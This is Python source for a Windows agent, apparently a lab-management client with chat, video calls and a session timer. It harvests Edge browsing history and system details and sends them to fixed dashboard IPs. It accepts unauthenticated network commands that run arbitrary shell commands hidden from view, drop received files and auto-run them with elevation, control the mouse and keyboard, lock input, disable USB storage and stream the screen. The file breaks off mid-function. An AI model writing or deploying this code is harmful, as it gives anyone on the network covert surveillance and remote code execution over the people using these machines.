import os
import io
import sys
import time
import json
import queue
import socket
import platform
import subprocess
import threading
import ctypes
import random
import sqlite3
import shutil
import tkinter as tk
from tkinter import scrolledtext

try:
    import keyboard
    import mouse
except ImportError:
    pass

# Third-party dependencies required for multimedia expansions
try:
    import pyaudio
except ImportError:
    try:
        import pyaudiowpatch as pyaudio
    except ImportError:
        pass

ui_queue = queue.Queue()

DASHBOARD_IPS = ["192.168.1.4", "172.65.21.45", "172.65.21.7", "172.65.21.90", "172.65.21.1", "172.65.21.6"]
TELEMETRY_PORT = 5005
LISTEN_COMMAND_PORT = 6006
STREAM_SERVER_PORT = 7007      
CHAT_STREAM_PORT = 8008
VIDEO_STREAM_PORT = 9555
AUDIO_STREAM_PORT = 9666  

EDGE_HISTORY_DIR = os.path.expandvars(r"%LOCALAPPDATA%\Microsoft\Edge\User Data\Default")
EDGE_HISTORY_FILE = os.path.join(EDGE_HISTORY_DIR, "History")

hardware_lock_state = {"Keyboard": False, "Printer": {}, "PnpDevices": {}, "usb_ports_blocked": False}
active_chat_room = {"peers": [], "ui_instance": None, "text_area": None, "roster_listbox_instance": None}
peer_colors = {}
mouse_hook_instance = None
global_root_engine = None  

active_video_call = {"peers": [],"is_active": False,"is_muted": False,"video_enabled": True,"cap_instance": None,"ui_window": None,"local_feed": None,"remote_feeds": {}}

# 30-Minute Global Countdown Session State Tracking Table
session_timer = {"seconds_left": 1800,"is_running": False,"video_label_instance": None,"chat_label_instance": None}

AUDIO_FORMAT = pyaudio.paInt16
AUDIO_CHANNELS = 1
AUDIO_RATE = 16000
AUDIO_CHUNK = 1024

def is_admin():
    try: 
        return ctypes.windll.shell32.IsUserAnAdmin()
    except: 
        return False

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('10.255.255.255', 1))
        IP = s.getsockname()[0]
    except Exception:
        IP = '127.0.0.1'
    finally:
        s.close()
    return IP

def fetch_system_specs():
    try:
        cmd_ram = 'powershell -ExecutionPolicy Bypass -NoProfile -Command "(Get-CimInstance Win32_OperatingSystem).TotalVisibleMemorySize"'
        ram_raw = subprocess.check_output(cmd_ram, shell=True).decode().strip()
        ram_gb = round(int(ram_raw) / (1024**2))
    except:
        ram_gb = "Unknown"

    try:
        mac_cmd = 'getmac /fo csv /nh'
        mac_raw = subprocess.check_output(mac_cmd, shell=True).decode(errors="ignore").splitlines()
        mac_address = "N/A"
        for line in mac_raw:
            parts = line.replace('"', '').split(',')
            if len(parts) >= 1:
                candidate = parts[0].strip()
                if candidate and candidate != "N/A":
                    mac_address = candidate
                    break
    except:
        mac_address = "N/A"

    return {"hostname": socket.gethostname(),"os": f"{platform.system()} {platform.release()}","cpu": platform.processor(),"ram": f"{ram_gb} GB RAM" if isinstance(ram_gb, int) else ram_gb,"mac": mac_address}

def gather_pnp_hardware_assets():
    devices = []
    target_classes = "'Mouse', 'Keyboard', 'Camera', 'Image', 'USB', 'DiskDrive/PenDrive', 'PrintQueue', 'Printer'"
    cmd_pnp = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-PnpDevice -PresentOnly | Where-Object {{$_.Class -in ({target_classes})}} | Select-Object FriendlyName, Class, InstanceId, Status | ConvertTo-Json -Compress"'
    try:
        out = subprocess.check_output(cmd_pnp, shell=True).decode('utf-8', errors='ignore').strip()
        if out:
            data = json.loads(out)
            if isinstance(data, dict): data = [data]
            for item in data:
                name = item.get("FriendlyName", "")
                if "root" in name.lower() or "controller" in name.lower() or "hub" in name.lower(): continue
                item_class = item.get("Class", "Peripheral")
                instance_id = item.get("InstanceId", "")
                
                if item_class == "Keyboard" and hardware_lock_state["Keyboard"]: 
                    display_status = "BLOCKED"
                elif item_class in ["PrintQueue", "Printer"] and hardware_lock_state["Printer"].get(name, False): 
                    display_status = "BLOCKED"
                elif hardware_lock_state["PnpDevices"].get(instance_id, False):
                    display_status = "BLOCKED"
                else:
                    raw_status = item.get("Status", "Unknown")
                    if raw_status in ["Error", "Degraded", "Disabled"]:
                        display_status = "BLOCKED"
                    else:
                        display_status = "Active"
                
                devices.append({"name": name, "type": item_class, "status": display_status, "raw_id": instance_id})
    except: 
        pass
    return devices

def gather_browsing_history():
    logs = []
    # Explicit definition of the target layout file
    if not os.path.exists(EDGE_HISTORY_FILE): 
        return logs
        
    temp_db = "edge_hist_temp.db"
    try:
        # Create a clean isolated local copy to evade Edge engine runtime file locks
        shutil.copy2(EDGE_HISTORY_FILE, temp_db)
        
        conn = sqlite3.connect(temp_db)
        cursor = conn.cursor()
        
        # FIX: Directly use SQLite's native formatting engine to securely convert Webkit epoch 
        # to a clean, universal string layout. This prevents Python processing exceptions.
        query = """
            SELECT 
                url, 
                datetime(last_visit_time / 1000000 + strftime('%s', '1601-01-01'), 'unixepoch', 'localtime') 
            FROM urls 
            WHERE last_visit_time > 0 
            ORDER BY last_visit_time DESC 
            LIMIT 35
        """
        cursor.execute(query)
        
        for row in cursor.fetchall():
            url_val = str(row[0]).strip()
            time_val = str(row[1]) if row[1] else "Unknown Time"
            
            # Ensure safe output filtering for incomplete records
            if url_val:
                logs.append({
                    "url": url_val, 
                    "time": time_val
                })
                
        conn.close()
    except Exception as e:
        # Standard sys stream reporting bypass to keep operations transparent 
        print(f"[*] Browsing history routine warning block: {e}")
        
    if os.path.exists(temp_db):
        try: os.remove(temp_db)
        except: pass
        
    return logs

def package_and_transmit_telemetry():
    payload = fetch_system_specs()
    payload["devices"] = gather_pnp_hardware_assets()
    payload["history"] = gather_browsing_history()
    payload["usb_status"] = "BLOCKED" if hardware_lock_state["usb_ports_blocked"] else "ACTIVE"
    data_bytes = json.dumps(payload).encode('utf-8')
    data_len = len(data_bytes)
    for host_ip in DASHBOARD_IPS:
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(3.0)
                s.connect((host_ip, TELEMETRY_PORT))
                s.sendall(data_len.to_bytes(4, byteorder='big'))
                s.sendall(data_bytes)
        except: 
            pass

def enforce_system_lock():
    global mouse_hook_instance
    try:
        keyboard.hook(lambda e: False, suppress=True)
        if mouse_hook_instance is None: mouse_hook_instance = mouse.hook(lambda e: False)
    except:
        pass

def release_system_lock():
    global mouse_hook_instance
    try: keyboard.unhook_all()
    except: pass
    if mouse_hook_instance is not None:
        try: 
            mouse.unhook(mouse_hook_instance)
        except: 
            pass
        mouse_hook_instance = None

def start_session_countdown():
    """Manages the master 30-minute decrement calculations in a dedicated thread."""
    if session_timer["is_running"]:
        return
    session_timer["is_running"] = True
    session_timer["seconds_left"] = 1800  # Reset explicitly to 30 mins

    def countdown_worker():
        while session_timer["seconds_left"] > 0 and session_timer["is_running"]:
            time.sleep(1.0)
            session_timer["seconds_left"] -= 1
            update_all_timer_displays()

        # Hard Cutoff Event Execution Loop Triggered on Expiration
        if session_timer["seconds_left"] <= 0:
            session_timer["is_running"] = False
            trigger_session_hard_termination()

    threading.Thread(target=countdown_worker, daemon=True).start()

def update_all_timer_displays():
    """Formats raw integers to clean digital outputs on active graphic layouts safely."""
    mins = session_timer["seconds_left"] // 60
    secs = session_timer["seconds_left"] % 60
    time_str = f"{mins:02d}:{secs:02d}"

    # Safe asynchronous cross-thread updates back to main UI engine loop instances
    if global_root_engine:
        global_root_engine.after(0, lambda: refresh_labels_text(time_str))

def refresh_labels_text(time_string):
    v_lbl = session_timer["video_label_instance"]
    c_lbl = session_timer["chat_label_instance"]
    
    try:
        if v_lbl and v_lbl.winfo_exists():
            v_lbl.config(text=f"// LIVE VIDEO MATRIX HUB  |  [TIME REMAINING: {time_string}]")
            if session_timer["seconds_left"] < 60: v_lbl.config(fg="#FF3333") # Warning red alert
    except: pass

    try:
        if c_lbl and c_lbl.winfo_exists():
            c_lbl.config(text=f"// ACTIVE PEER LINK MATRIX  |  [TIME REMAINING: {time_string}]")
            if session_timer["seconds_left"] < 60: c_lbl.config(fg="#FF3333")
    except: pass

def trigger_session_hard_termination():
    """Enforces absolute window system destruction on session timeout."""
    active_video_call["is_active"] = False # Signals network worker pools to collapse loops
    
    if global_root_engine:
        global_root_engine.after(0, execute_main_thread_shutdown_routines)

def execute_main_thread_shutdown_routines():
    # 1. Clear Active Video UI Instances
    v_win = active_video_call["ui_window"]
    if v_win:
        try: v_win.destroy()
        except: pass
    
    # 2. Clear Active Text Chat UI Layouts
    c_win = active_chat_room["ui_instance"]
    if c_win:
        try:
            # Force the clean multi-dashboard disconnect reporting to process
            c_win.destroy()
        except: pass

def process_administrative_enforcement(client_socket):
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
    except:
        return

    try:
        len_bytes = b""
        while len(len_bytes) < 4:
            chunk = client_socket.recv(4 - len(len_bytes))
            if not chunk: return
            len_bytes += chunk
        target_payload_size = int.from_bytes(len_bytes, byteorder='big')
        buffer = b""
        while len(buffer) < target_payload_size:
            chunk = client_socket.recv(min(target_payload_size - len(buffer), 65536))
            if not chunk: break
            buffer += chunk
        if len(buffer) < target_payload_size: return 
        
        directive = json.loads(buffer.decode('utf-8'))
        action = directive.get("action")
        screen_width, screen_height = pyautogui.size()

        if action == "poll_status":
            package_and_transmit_telemetry()
            return

        if action == "mouse_move":
            target_x = int(directive.get("x", 0) * screen_width)
            target_y = int(directive.get("y", 0) * screen_height)
            pyautogui.moveTo(target_x, target_y)
            return
        elif action == "mouse_click":
            target_x = int(directive.get("x", 0) * screen_width)
            target_y = int(directive.get("y", 0) * screen_height)
            btn = directive.get("button", "left")
            state = directive.get("state", "down")
            pyautogui.moveTo(target_x, target_y)
            if state == "down": pyautogui.mouseDown(button=btn)
            else: pyautogui.mouseUp(button=btn)
            return
        elif action == "key_input":
            input_type = directive.get("type", "")
            value = directive.get("value", "")
            if not value: return
            try:
                if input_type == "text":
                    pyautogui.write(value)
                elif input_type == "functional":
                    if value in pyautogui.KEYBOARD_KEYS:
                        pyautogui.press(value)
            except Exception as e:
                print(f"[Input Engine Error]: {e}")
            return
        elif action == "lock_input":
            hardware_lock_state["Keyboard"] = True
            enforce_system_lock()
            package_and_transmit_telemetry()
            return
        elif action == "unlock_input":
            hardware_lock_state["Keyboard"] = False
            release_system_lock()
            package_and_transmit_telemetry()
            return
        elif action == "execute_installer":
            cmd_string = directive.get("command")
            subprocess.Popen(cmd_string, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            return
        elif action == "drop_file":
            filename = directive.get("file_name", "downloaded_file.bin")
            target_size = directive.get("file_size", 0)
            raw_target_dir = directive.get("target_directory", r"%USERPROFILE%\Desktop")
            auto_run = directive.get("auto_run", False)
            
            # 1. Expand system environment variables and normalize path variables globally
            target_dir = os.path.expandvars(raw_target_dir)
            
            try:
                os.makedirs(target_dir, exist_ok=True)
            except Exception:
                # Fallback to User Desktop if the specified directory is restricted/invalid
                target_dir = os.path.expandvars(r"%USERPROFILE%\Desktop")
                os.makedirs(target_dir, exist_ok=True)

            destination_filepath = os.path.join(target_dir, filename)
            bytes_harvested = 0
            
            try:
                # 2. Ingest the binary stream sequentially over the active network socket
                with open(destination_filepath, "wb") as out_file:
                    while bytes_harvested < target_size:
                        bytes_left = target_size - bytes_harvested
                        socket_block = client_socket.recv(min(bytes_left, 65536))
                        if not socket_block: 
                            break
                        out_file.write(socket_block)
                        bytes_harvested += len(socket_block)
                
                # 3. Verify integrity: Ensure file exists and size matches expected buffer layout exactly
                if os.path.exists(destination_filepath) and os.path.getsize(destination_filepath) == target_size:
                    
                    # 4. Asynchronous Auto-Run Trigger Engine
                    # 4. Asynchronous Auto-Run Trigger Engine
                    if auto_run:
                        try:
                            import ctypes
                            
                            # Resolve absolute paths to bypass working directory ambiguity
                            abs_path = os.path.abspath(destination_filepath)
                            abs_dir = os.path.abspath(target_dir)
                            
                            # Dynamically use "runas" for executable files to force UAC elevation
                            execution_verb = "runas" if abs_path.lower().endswith(".exe") else "open"
                            
                            # ShellExecuteW bypasses subprocess limitations and passes UAC flags directly
                            ctypes.windll.shell32.ShellExecuteW(
                                None,          # Parent window handle
                                execution_verb, # Dynamically switched to "runas" for elevation
                                abs_path,      # Target file payload path
                                None,          # Optional parameters
                                abs_dir,       # Execution context working directory
                                1              # SW_SHOWNORMAL (Display application window normally)
                            )
                        except Exception as exec_err:
                            print(f"[Execution Engine Exception]: Failed to auto-start binary -> {exec_err}")
                    
                    notif_title = "FILE DEPLOYMENT SUCCESS"
                    notif_msg = f"Asset cleanly landed at destination:\n{destination_filepath}"
                else:
                    notif_title = "FILE DEPLOYMENT FAILED"
                    notif_msg = f"Network stream mismatch. Disk footprint does not equal payload metadata size."

                # 5. Push operational completion telemetry notification to GUI engine
                if global_root_engine:
                    global_root_engine.after(0, lambda: spawn_custom_toast(notif_title, notif_msg))
            
            except Exception as io_err:
                print(f"Agent transfer pipeline error: {io_err}")
            return
        
        elif action == "send_notification":
            notif_title = directive.get("title", "SYSTEM NOTICE")
            notif_msg = directive.get("message", "")
            
            def spawn_custom_toast(title, message):
                toast_win = tk.Toplevel()  
                toast_win.title(title)
                toast_win.attributes("-topmost", True)
                toast_win.configure(bg="#FFFFFF")
                toast_win.overrideredirect(True)
                sw = toast_win.winfo_screenwidth()
                sh = toast_win.winfo_screenheight()
                win_w, win_h = 360, 140
                toast_win.geometry(f"{win_w}x{win_h}+{sw - win_w - 20}+{sh - win_h - 60}")
                border_frame = tk.Frame(toast_win, bg="#CCCCCC", bd=1)
                border_frame.pack(fill=tk.BOTH, expand=True)
                inner_container = tk.Frame(border_frame, bg="#FFFFFF")
                inner_container.pack(fill=tk.BOTH, expand=True, padx=1, pady=1)
                btn_close = tk.Button(inner_container, text="×", font=("Segoe UI", 14, "bold"), fg="#666666", bg="#FFFFFF", bd=0, command=toast_win.destroy)
                btn_close.place(x=325, y=5, width=25, height=25)
                tk.Label(inner_container, text=title.upper(), font=("Segoe UI", 11, "bold"), fg="#000000", bg="#FFFFFF", anchor="w").pack(fill=tk.X, padx=(15, 40), pady=(12, 5))
                tk.Label(inner_container, text=message, font=("Segoe UI", 10), fg="#1A1A1A", bg="#FFFFFF", anchor="nw", justify=tk.LEFT, wraplength=320).pack(fill=tk.BOTH, expand=True, padx=15, pady=(0, 10))

            if global_root_engine:
                global_root_engine.after(0, lambda: spawn_custom_toast(notif_title, notif_msg))
            return
        elif action == "setup_chat_room":
            room_peers = directive.get("peers", [])
            active_chat_room["peers"] = room_peers
            start_session_countdown()  # Initialize countdown allocation clock tracker
            ui_queue.put("LAUNCH_CHAT")
            return    
        elif action == "setup_video_room":
            room_peers = directive.get("peers", [])
            start_session_countdown()  # Synchronize clock matrix allocation properties
            trigger_video_call_session(room_peers)
            return
        elif action == "terminate_video_room":
            active_video_call["is_active"] = False 
            session_timer["is_running"] = False
            return
        elif action in ["block_all_usb", "unblock_all_usb"]:
            if action == "block_all_usb":
                hardware_lock_state["usb_ports_blocked"] = True
                ps_script = r"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR' -Name Start -Value 4"
            else:
                hardware_lock_state["usb_ports_blocked"] = False
                ps_script = r"Set-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Services\USBSTOR' -Name Start -Value 3"
                
            subprocess.run(f'powershell -ExecutionPolicy Bypass -NoProfile -Command "{ps_script}"', shell=True, capture_output=True)
            package_and_transmit_telemetry()
            return

        target_id = directive.get("raw_id")
        device_type = directive.get("device_type", "")
        device_name = directive.get("device_name", "")

        if target_id or device_name:
            if device_type.strip().lower() in ["printqueue", "printer"]:
                if action == "block_device":
                    hardware_lock_state["Printer"][device_name] = True
                    full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Get-PrintJob -PrinterName \'{device_name}\' | Remove-PrintJob; Pause-Printer -Name \'{device_name}\'"'
                else:
                    hardware_lock_state["Printer"][device_name] = False
                    full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "Resume-Printer -Name \'{device_name}\'"'
                subprocess.run(full_command, shell=True, capture_output=True)
                package_and_transmit_telemetry()
                return

            if action == "block_device":
                hardware_lock_state["PnpDevices"][target_id] = True
            elif action == "unblock_device":
                hardware_lock_state["PnpDevices"][target_id] = False

            ps_action = "Enable-PnpDevice" if action == "unblock_device" else "Disable-PnpDevice"
            ps_script = f"{ps_action} -InstanceId '{target_id}' -Confirm:$false"
            full_command = f'powershell -ExecutionPolicy Bypass -NoProfile -Command "{ps_script}"'
            subprocess.run(full_command, shell=True, capture_output=True)
            package_and_transmit_telemetry()
            
    except: 
        pass
    finally:
        try: client_socket.close()
        except: pass

def command_listener_interface():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server.bind(('0.0.0.0', LISTEN_COMMAND_PORT))
        server.listen(10)
    except: return
    while True:
        try:
            sock, _ = server.accept()
            threading.Thread(target=process_administrative_enforcement, args=(sock,), daemon=True).start()
        except: pass

def screen_stream_listener_interface():
    try:
        import pyautogui
        pyautogui.FAILSAFE = False
    except:
        return
    stream_server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    stream_server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        stream_server.bind(('0.0.0.0', STREAM_SERVER_PORT))
        stream_server.listen(2)
    except: return
    while True:
        try:
            conn, _ = stream_server.accept()
            def serve_screen_stream_worker(c):
                try:
                    while True:
                        screenshot = pyautogui.screenshot().convert("RGB")
                        img_byte_arr = io.BytesIO()
                        screenshot.save(img_byte_arr, format='JPEG', quality=45)
                        img_bytes = img_byte_arr.getvalue()
                        c.sendall(len(img_bytes).to_bytes(4, byteorder='big'))
                        c.sendall(img_bytes)
                        time.sleep(0.05)
                except: pass
                finally:
                    try: c.close()
                    except: pass
            threading.Thread(target=serve_screen_stream_worker, args=(conn,), daemon=True).start()
        except: pass

def handle_ui_msg_insertion(sender_ip, msg_body, peer_ip_address):
    if peer_ip_address not in active_chat_room["peers"]:
        active_chat_room["peers"].append(peer_ip_address)
        refresh_roster_display()
        
    assigned_color = get_or_assign_peer_color(peer_ip_address)
    if peer_ip_address not in peer_colors:
        peer_colors[peer_ip_address] = assigned_color
        refresh_roster_display()
        
    if active_chat_room["ui_instance"] and active_chat_room["text_area"]:
        ta = active_chat_room["text_area"]
        safe_tag_id = f"tag_{peer_ip_address.replace('.', '_')}"
        try:
            ta.tag_configure(safe_tag_id, justify="left", foreground=assigned_color)
            ta.config(state="normal")
            ta.insert(tk.END, f"[{peer_ip_address}]: ", safe_tag_id)
            ta.insert(tk.END, f"{msg_body}\n", "peer_msg")
            ta.config(state="disabled")
            ta.see(tk.END)
        except:
            pass

def peer_chat_receiver_interface():
    chat_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    chat_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        chat_socket.bind(('0.0.0.0', CHAT_STREAM_PORT))
        chat_socket.listen(20)
    except: return

    while True:
        try:
            sock, _ = chat_socket.accept()
            try:
                peer_ip_address = sock.getpeername()[0]
                data = sock.recv(4096).decode('utf-8')
                if data:
                    payload = json.loads(data)
                    msg_type = payload.get("type", "message")
                    
                    if msg_type == "ping":
                        status_reply = "active" if active_chat_room["ui_instance"] is not None else "inactive"
                        sock.sendall(json.dumps({"status": status_reply}).encode('utf-8'))
                        sock.close()
                        continue
                    
                    sender_ip = payload.get("sender_ip", peer_ip_address)
                    msg_body = payload.get("message", "")
                    
                    ui_window = active_chat_room["ui_instance"]
                    if ui_window is not None:
                        ui_window.after(0, lambda s=sender_ip, b=msg_body, ip=peer_ip_address: handle_ui_msg_insertion(s, b, ip))
            except:
                pass
            finally:
                try: sock.close()
                except: pass
        except: pass

def audio_receiver_interface():
    audio_instance = pyaudio.PyAudio()
    out_stream = audio_instance.open(format=AUDIO_FORMAT, channels=AUDIO_CHANNELS, rate=AUDIO_RATE, output=True, frames_per_buffer=AUDIO_CHUNK)
    
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind(('0.0.0.0', AUDIO_STREAM_PORT))
        server_socket.listen(15)
    except:
        return

    while True:
        try:
            sock, _ = server_socket.accept()
            def stream_audio_worker(s):
                try:
                    while active_video_call["is_active"]:
                        audio_data = s.recv(AUDIO_CHUNK * 2)
                        if not audio_data: break
                        out_stream.write(audio_data)
                except:
                    pass
                finally:
                    try: s.close()
                    except: pass
            threading.Thread(target=stream_audio_worker, args=(sock,), daemon=True).start()
        except:
            pass

def broadcast_audio_stream():
    audio_instance = pyaudio.PyAudio()
    in_stream = audio_instance.open(format=AUDIO_FORMAT, channels=AUDIO_CHANNELS, rate=AUDIO_RATE, input=True, frames_per_buffer=AUDIO_CHUNK)
    
    local_ip = get_local_ip()
    peer_sockets = []

    for peer_ip in list(active_video_call["peers"]):
        if peer_ip in ["127.0.0.1", "localhost", local_ip]: continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((peer_ip, AUDIO_STREAM_PORT))
            peer_sockets.append(s)
        except:
            pass

    while active_video_call["is_active"]:
        try:
            raw_data = in_stream.read(AUDIO_CHUNK, exception_on_overflow=False)
            if active_video_call["is_muted"]:
                raw_data = b'\x00' * len(raw_data)
                
            for s in list(peer_sockets):
                try:
                    s.sendall(raw_data)
                except:
                    peer_sockets.remove(s)
                    try: s.close()
                    except: pass
        except:
            break

    try: in_stream.stop_stream(); in_stream.close(); audio_instance.terminate()
    except: pass
    for s in peer_sockets:
        try: s.close()
        except: pass

def video_receiver_interface():
    import cv2
    import numpy as np

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        server_socket.bind(('0.0.0.0', VIDEO_STREAM_PORT))
        server_socket.listen(15)
    except: return

    while True:
        try:
            sock, addr = server_socket.accept()
            peer_ip = addr[0]

            def play_video_worker(s, ip):
                try:
                    while active_video_call["is_active"]:
                        len_bytes = s.recv(4)
                        if not len_bytes: break
                        length = int.from_bytes(len_bytes, byteorder='big')

                        data = b""
                        while len(data) < length:
                            packet = s.recv(length - len(data))
                            if not packet: break
                            data += packet

                        if data and "ui_window" in active_video_call and active_video_call["ui_window"]:
                            np_arr = np.frombuffer(data, dtype=np.uint8)
                            frame = cv2.imdecode(np_arr, cv2.IMREAD_COLOR)
                            if frame is not None:
                                active_video_call["remote_feeds"][ip] = frame
                except: pass
                finally:
                    try: s.close()
                    except: pass
                    if ip in active_video_call["remote_feeds"]:
                        del active_video_call["remote_feeds"][ip]

            threading.Thread(target=play_video_worker, args=(sock, peer_ip), daemon=True).start()
        except: pass

def broadcast_video_stream():
    import cv2

    if not active_video_call["is_active"] or active_video_call["cap_instance"] is None:
        return

    cap = active_video_call["cap_instance"]
    local_ip = get_local_ip()
    peer_sockets = []

    for peer_ip in list(active_video_call["peers"]):
        if peer_ip in ["127.0.0.1", "localhost", local_ip]: continue
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((peer_ip, VIDEO_STREAM_PORT))
            peer_sockets.append(s)
        except: pass

    while active_video_call["is_active"] and cap.isOpened():
        ret, frame = cap.read()
        if not ret: break

        frame = cv2.flip(frame, 1)
        frame_resized = cv2.resize(frame, (320, 240))

        if active_video_call["video_enabled"]:
            active_video_call["local_feed"] = frame_resized
            ret_enc, encoded_img = cv2.imencode('.jpg', frame_resized, [int(cv2.IMWRITE_JPEG_QUALITY), 50])
            if not ret_enc: continue
            img_bytes = encoded_img.tobytes()
        else:
            import numpy as np
            blank_frame = np.zeros((240, 320, 3), dtype=np.uint8)
            active_video_call["local_feed"] = blank_frame
            ret_enc, encoded_img = cv2.imencode('.jpg', blank_frame, [int(cv2.IMWRITE_JPEG_QUALITY), 30])
            img_bytes = encoded_img.tobytes()

        img_len = len(img_bytes)

        for s in list(peer_sockets):
            try:
                s.sendall(img_len.to_bytes(4, byteorder='big'))
                s.sendall(img_bytes)
            except:
                peer_sockets.remove(s)
                try: s.close()
                except: pass

    if cap: cap.release()
    for s in peer_sockets:
        try: s.close()
        except: pass

def spawn_video_ui_window():
    import cv2
    from PIL import Image, ImageTk

    vc_room = tk.Toplevel()
    vc_room.title("NEXUS SECURE VIDEO CORE MANAGER")
    vc_room.geometry("800x680")
    vc_room.configure(bg="#0A0D14")
    
    active_video_call["ui_window"] = vc_room
    
    # Synchronize tracking references explicitly for real-time countdown updates
    lbl_title = tk.Label(vc_room, text="// LIVE VIDEO MATRIX HUB  |  [TIME REMAINING: 30:00]", font=("Consolas", 12, "bold"), fg="#00F0FF", bg="#0A0D14")
    lbl_title.pack(anchor="w", padx=20, pady=15)
    session_timer["video_label_instance"] = lbl_title

    grid_container = tk.Frame(vc_room, bg="#0A0D14")
    grid_container.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)

    panels = {}

    def ui_refresh_loop():
        if not active_video_call["is_active"] or not vc_room.winfo_exists():
            close_video_session()
            return

        if active_video_call["local_feed"] is not None:
            if "LOCAL" not in panels:
                frame_box = tk.Frame(grid_container, bg="#141923", bd=1, relief="solid")
                frame_box.grid(row=0, column=0, padx=10, pady=10)
                
                lbl = tk.Label(frame_box, bg="#141923")
                lbl.pack()
                lbl_name = tk.Label(frame_box, text="[MY WEBCAM (LOCAL)]", font=("Segoe UI", 9, "bold"), fg="#707E94", bg="#141923")
                lbl_name.pack(pady=2)
                panels["LOCAL"] = lbl

            img_rgb = cv2.cvtColor(active_video_call["local_feed"], cv2.COLOR_BGR2RGB)
            img_tk = ImageTk.PhotoImage(Image.fromarray(img_rgb))
            panels["LOCAL"].config(image=img_tk)
            panels["LOCAL"].image = img_tk

        current_peers = list(active_video_call["remote_feeds"].keys())
        for idx, peer_ip in enumerate(current_peers):
            col = (idx + 1) % 2
            row = (idx + 1) // 2

            if peer_ip not in panels:
                frame_box = tk.Frame(grid_container, bg="#141923", bd=1, relief="solid")
                frame_box.grid(row=row, column=col, padx=10, pady=10)
                
                lbl = tk.Label(frame_box, bg="#141923")
                lbl.pack()
                lbl_name = tk.Label(frame_box, text=f"[REMOTE IP: {peer_ip}]", font=("Segoe UI", 9, "bold"), fg="#00F0FF", bg="#141923")
                lbl_name.pack(pady=2)
                panels[peer_ip] = lbl

            img_rgb = cv2.cvtColor(active_video_call["remote_feeds"][peer_ip], cv2.COLOR_BGR2RGB)
            img_tk = ImageTk.PhotoImage(Image.fromarray(img_rgb))
            panels[peer_ip].config(image=img_tk)
            panels[peer_ip].image = img_tk

        for existing_ip in list(panels.keys()):
            if existing_ip != "LOCAL" and existing_ip not in current_peers:
                panels[existing_ip].master.destroy()
                del panels[existing_ip]

        vc_room.after(30, ui_refresh_loop)

    def close_video_session():
        active_video_call["is_active"] = False
        session_timer["is_running"] = False # Shutdown background decrement worker thread context
        if active_video_call["cap_instance"]:
            active_video_call["cap_instance"].release()
        
        try:
            DASHBOARD_PORT = 5005
            disconnect_payload = json.dumps({
                "type": "status_update",
                "status": "idle",
                "peers": []
            }).encode('utf-8')
            payload_len = len(disconnect_payload)

            def broadcast_disconnect_worker():
                for db_ip in DASHBOARD_IPS:
                    try:
                        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                            s.settimeout(1.0)
                            s.connect((db_ip, DASHBOARD_PORT))
                            s.sendall(payload_len.to_bytes(4, byteorder='big'))
                            s.sendall(disconnect_payload)
                    except: pass
            threading.Thread(target=broadcast_disconnect_worker, daemon=True).start()
        except Exception as e:
            print(f"[VC Telemetry Error]: {e}")

        try: vc_room.destroy()
        except: pass

    control_bar = tk.Frame(vc_room, bg="#0E131F", height=60)
    control_bar.pack(fill=tk.X, side=tk.BOTTOM, ipady=10)

    def toggle_audio_mute():
        active_video_call["is_muted"] = not active_video_call["is_muted"]
        if active_video_call["is_muted"]:
            btn_mute.config(text="UNMUTE MIC", bg="#EF4444")
        else:
            btn_mute.config(text="MUTE MIC", bg="#1F2937")

    def toggle_video_feed():
        active_video_call["video_enabled"] = not active_video_call["video_enabled"]
        if active_video_call["video_enabled"]:
            btn_video.config(text="STOP VIDEO", bg="#1F2937")
        else:
            btn_video.config(text="START VIDEO", bg="#D97706")

    btn_mute = tk.Button(control_bar, text="MUTE MIC", font=("Segoe UI", 9, "bold"), fg="#FFFFFF", bg="#1F2937", activebackground="#374151", bd=0, width=15, height=2, cursor="hand2", command=toggle_audio_mute)
    btn_mute.pack(side=tk.LEFT, padx=30, pady=5)

    btn_video = tk.Button(control_bar, text="STOP VIDEO", font=("Segoe UI", 9, "bold"), fg="#FFFFFF", bg="#1F2937", activebackground="#374151", bd=0, width=15, height=2, cursor="hand2", command=toggle_video_feed)
    btn_video.pack(side=tk.LEFT, padx=10, pady=5)

    btn_disconnect = tk.Button(control_bar, text="DISCONNECT", font=("Segoe UI", 9, "bold"), fg="#FFFFFF", bg="#DC2626", activebackground="#B91C1C", bd=0, width=15, height=2, cursor="hand2", command=close_video_session)
    btn_disconnect.pack(side=tk.RIGHT, padx=30, pady=5)

    vc_room.protocol("WM_DELETE_WINDOW", close_video_session)
    update_all_timer_displays() # Initial sync sweep execution mapping pass
    ui_refresh_loop()

def trigger_video_call_session(selected_peers):
    if active_video_call["is_active"]: return

    active_video_call["peers"] = selected_peers
    active_video_call["local_feed"] = None
    active_video_call["remote_feeds"] = {} 
    active_video_call["is_active"] = True
    active_video_call["is_muted"] = False       
    active_video_call["video_enabled"] = True   
    
    import cv2
    cap = cv2.VideoCapture(0)
    if not cap.isOpened():
        print("[VC Video Alert]: No webcam device detected at index root 0.")
        active_video_call["is_active"] = False
        return

